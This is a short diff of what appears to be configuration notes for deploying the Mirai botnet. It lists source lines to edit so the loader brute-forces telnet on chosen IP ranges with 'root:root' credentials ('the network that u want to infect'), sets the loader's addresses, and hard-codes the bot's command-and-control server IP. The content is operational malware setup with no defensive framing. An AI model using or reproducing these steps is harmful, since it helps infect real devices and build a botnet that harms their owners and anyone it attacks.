@@ -7,7 +7,6 @@
 2. **mirai/loader/src/main.c :**
 - snprintf(strbuf, sizeof(strbuf), "13.53.41.%d:23 root:root", i); // the network that u want to infect
 - snprintf(strbuf, sizeof(strbuf), "13.60.46.%d:23 root:root", o4); // the network that u want to infect
-- addrs[0] = inet_addr("192.168.1.57"); // IP privee of the loader
 - if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP publique of the loader
 4. **mirai/bot/main.c**
      srv_addr.sin_addr.s_addr = inet_addr("13.49.244.108");  // IP du CNC
